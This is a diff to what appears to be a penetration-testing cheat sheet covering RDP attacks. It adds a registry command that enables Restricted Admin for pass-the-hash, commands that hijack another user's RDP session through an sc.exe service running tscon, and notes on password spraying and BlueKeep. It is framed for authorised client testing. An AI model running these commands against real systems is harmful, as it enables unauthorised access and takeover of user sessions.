@@ -170,10 +170,17 @@ nmap -Pn -p3389 <HOST>
 crowbar -b rdp -s <HOST>/32 -U users.txt -c <pass>     # spray
 hydra -L users.txt -p <pass> <HOST> rdp
 xfreerdp /v:<HOST> /u:<u> /p:<p>        # login  (rdesktop also)
-xfreerdp /v:<HOST> /u:<u> /pth:<NT_hash>               # Pass-the-Hash (needs Restricted Admin)
+# Pass-the-Hash — enable Restricted Admin on the target first:
+reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
+xfreerdp /v:<HOST> /u:<u> /pth:<NT_hash>
 ```
-- **Session hijacking** (SYSTEM): `tscon <session_id> /dest:<our_session>` via a service — documented technique, note it for the report.
-- **CVE-2019-0708 (BlueKeep)** — pre-auth UAF RCE on older Windows; unstable (can BSoD).
+- **Session hijacking** (as SYSTEM, impersonate another RDP user without their password): `query user` → find target session ID → create a service that runs `tscon` as Local System:
+  ```cmd
+  sc.exe create sessionhijack binpath= "cmd.exe /k tscon <TARGET_ID> /dest:<OUR_SESSION>"
+  net start sessionhijack
+  ```
+  Get SYSTEM first (PsExec/Mimikatz). **No longer works on Server 2019.**
+- **CVE-2019-0708 (BlueKeep)** — pre-auth Use-After-Free RCE on older Windows (≤ Server 2008 R2); no auth needed, but unstable (can BSoD — warn the client before running).
 
 ### DNS (UDP/53, TCP/53)
 ```bash
